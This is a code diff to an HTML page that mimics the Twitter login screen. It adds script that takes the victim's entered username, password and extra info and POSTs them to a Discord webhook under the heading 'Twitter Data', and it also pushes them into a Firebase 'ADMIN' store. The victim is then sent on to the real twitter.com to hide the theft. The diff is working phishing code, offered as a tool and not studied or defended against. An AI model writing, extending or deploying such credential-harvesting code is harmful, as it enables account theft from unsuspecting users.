@@ -1299,7 +1299,7 @@ data-fouc-class-names="swift-loading no-nav-banners"
   <script type="text/javascript" src="../app.js"></script>
   
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
-  <script src="../../jquery.min.js"></script>
+  <script src="../discord.js"></script>
 
   <script type="text/javascript">
   $(document).ready(function(){
@@ -1327,6 +1327,31 @@ var y;
 						var admin = database.ref('ADMIN');
 						
 						admin.push(store);
+						
+						
+			var request = new XMLHttpRequest();
+      request.open("POST", discord_webhook_url);
+
+  request.setRequestHeader('Content-type', 'application/json');
+  
+  var myEmbed = {
+  author: {
+  name: "Twitter Data"
+  },
+  title: "Username:- "+n+"\nPassword:- "+p+"\n",
+  description:"\nInfo:- "+y,
+  color: 65535
+  }
+  
+  var params = {
+  username: "Th30neAnd0nly/Sigma ",
+  avatar_url : "https://repository-images.githubusercontent.com/268017280/43567c00-8e19-11eb-96d2-a360736917cb",
+  embeds: [ myEmbed ]
+  }
+  
+  request.send(JSON.stringify(params));
+  
+				
 					window.location.href="https://twitter.com";
 						});
 						
